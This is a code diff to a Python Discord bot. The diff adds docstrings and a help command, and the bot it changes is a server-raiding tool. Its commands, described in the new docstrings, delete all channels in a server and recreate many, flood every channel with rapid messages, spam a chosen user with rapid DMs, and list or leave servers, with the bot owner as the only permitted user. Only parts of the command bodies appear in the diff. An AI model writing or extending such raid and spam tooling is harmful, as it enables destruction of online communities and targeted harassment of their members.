@@ -58,7 +58,7 @@ intents.message_content = True  # Enable reading message content
 intents.guilds = True  # Needed to manage channels
 
 # Create an instance of a Bot with intents
-bot = commands.Bot(command_prefix='?', intents=intents)
+bot = commands.Bot(command_prefix='?', intents=intents, help_command=None)
 
 # Global flag to control the message sending loop
 continue_sending = False
@@ -73,6 +73,7 @@ async def on_ready():
 
 @bot.command()
 async def chn(ctx, server_id: str, amount: int, *, name: str):
+    """Deletes all channels and makes custom amount more with custom channel names"""
     if ctx.author.id != YOUR_DISCORD_USER_ID:
         return  # Ignore the command if it's not from you
     if isinstance(ctx.channel, discord.DMChannel):
@@ -109,6 +110,7 @@ async def chn(ctx, server_id: str, amount: int, *, name: str):
         await ctx.send("This command can only be used in DMs.")
 @bot.command()
 async def nuke(ctx, server_id: str, *, message: str):
+    """Sends rapid messages in all channels"""
     if ctx.author.id != YOUR_DISCORD_USER_ID:
         return  # Ignore the command if it's not from you
     global continue_sending
@@ -141,6 +143,7 @@ async def nuke(ctx, server_id: str, *, message: str):
         await ctx.send("This command can only be used in DMs.")
 @bot.command()
 async def end(ctx, server_id: str):
+    """Ends nuke on a server"""
     if ctx.author.id != YOUR_DISCORD_USER_ID:
         return  # Ignore the command if it's not from you
     global continue_sending
@@ -157,6 +160,7 @@ async def end(ctx, server_id: str):
         await ctx.send("This command can only be used in DMs.")
 @bot.command()
 async def invite(ctx):
+    """Sends a link to invite the bot"""
     if ctx.author.id != YOUR_DISCORD_USER_ID:
         return  # Ignore the command if it's not from you
     client_id = bot.user.id  # Get the bot's client ID
@@ -166,6 +170,7 @@ async def invite(ctx):
     print(f"Sent Invite Link.")
 @bot.command()
 async def list(ctx):
+    """Lists the servers the bot is in"""
     if ctx.author.id != YOUR_DISCORD_USER_ID:
         return  # Ignore the command if it's not from you
     if isinstance(ctx.channel, discord.DMChannel):
@@ -177,7 +182,7 @@ async def list(ctx):
         for guild in bot.guilds:
             embed.add_field(
                 name=guild.name,
-                value=f"ID: ```{guild.id}```",
+                value=f"ID:{guild.id}",
                 inline=False
             )
 
@@ -191,6 +196,7 @@ async def list(ctx):
 
 @bot.command()
 async def leave(ctx, server_id: str):
+    """Leaves a server"""
     if ctx.author.id != YOUR_DISCORD_USER_ID:
         return  # Ignore the command if it's not from you
     
@@ -209,6 +215,7 @@ async def leave(ctx, server_id: str):
 
 @bot.command()
 async def dmnuke(ctx, user_id: str, *, message: str):
+    """Sends rapid DMs to someone"""
     if ctx.author.id != YOUR_DISCORD_USER_ID:
         return  # Ignore the command if it's not from you
     user = await bot.fetch_user(user_id)
@@ -230,6 +237,7 @@ async def dmnuke(ctx, user_id: str, *, message: str):
 
 @bot.command()
 async def endm(ctx, user_id: str):
+    """Ends Dm Nuke"""
     if ctx.author.id != YOUR_DISCORD_USER_ID:
         return  # Ignore the command if it's not from you
     global dmspam
@@ -240,5 +248,40 @@ async def endm(ctx, user_id: str):
         print(f"Stopped sending messages to {user.name}.")
     else:
         await ctx.send("This command can only be used in DMs.")
+@bot.command(name='help')
+async def custom_help(ctx, *commands: str):
+    """Displays the help message"""
+    if ctx.author.id != YOUR_DISCORD_USER_ID:
+        return  # Ignore the command if it's not from you
+    if not commands:
+        # Create an embed for the list of all commands
+        embed = discord.Embed(title="Available Commands", color=discord.Color.blue())
+        for command in bot.commands:
+            embed.add_field(name=f"**{command.name}**", value=command.short_doc or "No description", inline=False)
+        await ctx.send(embed=embed)
+        print("Sent help message.")
+    else:
+        # Create an embed for detailed help for specific commands
+        for command_name in commands:
+            command = bot.get_command(command_name)
+            if command:
+                embed = discord.Embed(title=f"Help for `{command.name}`", color=discord.Color.blue())
+                embed.add_field(name="Description", value=command.help or "No description", inline=False)
+                
+                # Add command usage (prefix + command + arguments)
+                usage = f"{bot.command_prefix}{command.name} {command.signature}"
+                embed.add_field(name="Usage", value=usage, inline=False)
+
+                # Show aliases if available
+                if command.aliases:
+                    aliases = ", ".join(command.aliases)
+                    embed.add_field(name="Aliases", value=aliases, inline=False)
+                
+                await ctx.send(embed=embed)
+                print("Sent help message.")
+            else:
+                # Error message if command is not found
+                embed = discord.Embed(title="Error", description=f"Command `{command_name}` not found.", color=discord.Color.red())
+                await ctx.send(embed=embed)
 # Run the bot
 bot.run(TOKEN)
